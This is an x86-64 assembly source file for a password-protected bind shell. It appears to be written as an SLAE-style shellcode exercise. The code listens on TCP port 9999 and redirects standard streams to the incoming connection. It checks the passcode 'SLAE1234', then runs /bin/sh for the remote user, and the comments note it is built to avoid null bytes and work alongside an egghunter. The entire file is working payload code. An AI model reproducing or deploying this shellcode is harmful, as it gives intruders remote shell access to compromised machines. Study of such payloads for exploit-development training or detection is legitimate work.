; bind_shell.asm
; Author: Alex

global _start


section .text ; stores the main program code

_start:

    jmp short begin
    enter_passcode: db 'Please enter the passcode:', 0xa
    granted: db 'Access Granted!', 0xa


begin:

    xor rax, rax    ; zero out RAX, RDI and RSI
    xor rdi, rdi    ; to make the shellcode more stable especially
    xor rsi, rsi    ; when used with other shellcode like the 'egghunter' one

    ; C code - server_sockfd = socket(PF_INET, SOCK_STREAM, 0);

    mov al, 41      ; move the 'socket' syscall number 41 (0x29 in HEX) into AL, RAX (AL) needs to contain this number
    mov dil, 2      ; move the first SYS_SOCKET argument value of 'PF_INET' - '2' into RDI (1 byte = DIL)
    mov sil, 1      ; move the second SYS_SOCKET argument value of 'SOCK_STREAM' - '1' into RSI (1 byte = SIL) 
    xor rdx, rdx    ; zero out RDX to make it contain the third SYS_SOCKET protocol argument value of '0'
    syscall         ; issue the 'socket' syscall
    
    mov dil, al     ; the syscall will return the socket file descriptor value into RAX, so move that value into RDI (DIL) to be used for later


    ; C code  - serveraddr.sin_family = AF_INET;
    ;         - serveraddr.sin_port = htons(9999);
    ;         - serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    ;         - bind(server_sockfd, (struct sockaddr*) &serveraddr, sizeof(serveraddr));

    ; the following three values of the 'serveraddr' struct are pushed onto the stack in reverse order

    push rdx            ; push the third value of the 'serveraddr' struct, which is 'htonl(INADDR_ANY)/sin_addr' - '0', onto the stack
    push WORD 0x0f27    ; push the second value of the 'serveraddr' struct, which is 'htons(9999)/sin_port' - '3879', onto the stack (added 'WORD' to get rid of 00 bytes)
    push WORD 0x02      ; push the first value of the 'serveraddr' struct, which is 'AF_INET/sin_family' - '2', onto the stack

    ; the following arguments of the 'bind()' syscall are assigned to the appropriate registers

    mov al, 49          ; move the 'bind' syscall number 49 (0x31 in HEX) into AL, RAX (AL) needs to contain this number

    ; there is no need to move/push the first SYS_BIND protocol argument value of 'server_sockfd' because RDI (DIL) will already store this value

    mov rsi, rsp        ; move the second SYS_BIND protocol argument value of '(struct sockaddr*) &serveraddr' - the pointer to the three 'serveraddr' struct values into RSI
    mov dl, 16          ; move the third SYS_BIND protocol argument value of 'sizeof(serveraddr)' - '16' (in decimal) into RDX (DL)
    syscall             ; issue the 'bind' syscall


    ; C code - listen(server_sockfd, 2); 

    mov al, 50       ; move the 'listen' syscall number 50 (0x32 in HEX) into AL, RAX (AL) needs to contain this number

    ; there is no need to move/push the first SYS_LISTEN protocol argument value of 'server_sockfd' because RDI (DIL) will already store this value

    mov sil, 2       ; move the second SYS_LISTEN protocol argument value of 'backlog' - '2' into RSI (SIL)
    syscall          ; issue the 'listen' syscall


    ; C code - client_sockfd = accept(server_sockfd, NULL, NULL); 

    mov al, 43     ; move the 'accept' syscall number 43 (0x2B in HEX) into AL, RAX (AL) needs to contain this number

    ; there is no need to move/push the first SYS_ACCEPT protocol argument value of 'server_sockfd' because RDI (DIL) will already store this value

    xor rsi, rsi   ; zero out the SYS_ACCEPT protocol argument value of 'addr' - '00' (NULL)
    xor rdx, rdx   ; zero out the SYS_ACCEPT protocol argument value of 'addrlen' - '00' (NULL)
    syscall        ; issue the 'accept' syscall


    ; C code - dup2(client_sockfd, 0);
    ;        - dup2(client_sockfd, 1);
    ;        - dup2(client_sockfd, 2);

    mov dil, al    ; the 'accept' syscall will return the client file descriptor value into RAX (AL), so move that value into RDI (DIL) to be used as the first dup2 argument value

    ; RSI is already zeroed out and set to the initial STDIN value of 0

dup2_loop:
    mov al, 33     ; move the 'dup2' syscall number 33 (0x21 in HEX) into AL, RAX (AL) needs to contain this number
    syscall        ; issue the 'dup2' syscall
    inc rsi        ; increment the value of RSI by 1 to set it to STDOUT - 1 (second loop), and then to STDERR - 2 (third loop)
    cmp sil, 2     ; compare the value of RSI (SIL) with 2
    jle dup2_loop  ; if the value of SIL is less than or equal to 2, jump to dup2_loop


    
    ; C code - char passcode[] = "SLAE1234";
    ;          char password_buffer[16];
    ;          write(client_sockfd, "Please enter the passcode:\n", 27);
    ;          read(client_sockfd, password_buffer, 16);
    ;          password_buffer[strcspn(password_buffer, "\n")] = '\0';
    ;          if (strcmp(password_buffer, passcode) == 0)
    ;          {
    ;               write(client_sockfd, "Access Granted!\n", 16);
    ;               execve("/bin/sh", NULL, NULL);
    ;               close(server_sockfd); 
    ;          }

  
    xor rax, rax                  ; zero out RAX
    mov al, 1                     ; move the 'write' syscall number 1 into RAX

    ; RDI already contains the client file descriptor value after the returned 'accept' syscall
    
    xor r12, r12                  ; zero out r12
    mov r12, rdi                  ; move the client file descriptor value into R12 for the 'Access Granted' message to be displayed later

    xor rsi, rsi                  ; zero out RSI
    lea rsi, [rel enter_passcode] ; move the address of the 'Please enter the passcode:' string into RSI
    add dl, 27                    ; move the length of the string into RDX
    syscall                       ; issue the 'write' syscall


    xor rax, rax  ; zero out RAX to store the 'read' syscall number 0

    ; RDI already contains the client file descriptor value after the returned 'accept' syscall

    push rax      ; allocate 16 bytes on the stack 
    push rax      ; for our password buffer
    mov rsi, rsp  ; RSI needs to point to our buffer on the stack
    mov dl, 16    ; read up to 16 bytes, this needs to be stored in RDX
    syscall       ; issue the 'read' syscall

    mov rdi, rsp                  ; RDI needs to point to the buffer on the stack that will contain the entered passcode
    mov rax, 0x3433323145414c53   ; RAX needs to contain the string 'SLAE1234' (little-endian - '4321EALS')  
    scasq                         ; compare the string 'SLAE1234' loaded in RAX with what was inserted in the buffer pointed to by RDI
    je spawn_shell                ; if the strings match, spawn an interactive shell, otherwise exit gracefully

    ; Exit
    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall


spawn_shell:

    ; Display the 'Access Granted' message to the user

    xor rax, rax                ; zero out RAX
    mov al, 1                   ; move the 'write' syscall number 1 into RAX
    xor rdi, rdi                ; zero out RDI
    mov rdi, r12                ; move the client file descriptor value into RDI
    xor rsi, rsi                ; zero out RSI
    lea rsi, [rel granted]      ; move the address of the 'Access Granted' string into RSI
    xor rdx, rdx                ; zero out RDX
    add dl, 16                  ; move the length of the string into RDX
    syscall                     ; issue the 'write' syscall


    ; C code - execve("/bin/sh", NULL, NULL);

    xor rax, rax                ; zero out RAX
    push rax                    ; push the first NULL onto the stack
    mov rbx, 0x68732f2f6e69622f ; move 'hs//nib/' (little-endian) into RBX
    push rbx                    ; push that value onto the stack
    mov rdi, rsp                ; RSP is now pointing to a memory address containing the begining of our string + 00, so move its value into RDI    
    push rax                    ; push the second NULL onto the stack   
    mov rdx, rsp                ; RSP is now pointing to a memory address containing 0000000000000000, so move its value into RDX
    push rdi                    ; push the memory address of the /bin//sh string + 00 onto the stack
    mov rsi, rsp                ; move this memory address from RSP into RSI
    add rax, 59                 ; add the 'execve' syscall number 59 (0x3B in HEX) to RAX, RAX needs to contain this number
    syscall                     ; issue the 'execve' syscall

